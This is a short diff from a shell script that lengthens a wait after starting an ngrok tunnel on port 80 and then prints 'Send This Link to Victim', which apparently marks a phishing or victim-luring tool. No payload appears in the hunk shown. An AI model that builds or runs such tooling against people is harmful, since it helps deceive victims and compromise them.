@@ -74,7 +74,7 @@ echo ""
                 echo""
                 echo""
                 ./ngrok http 80 > /dev/null &
-		sleep 12
+		sleep 25
                 ./Logo.sh
                 echo ""                          
                 echo   -e $yellow "// [ Send This Link to Victim ] //"
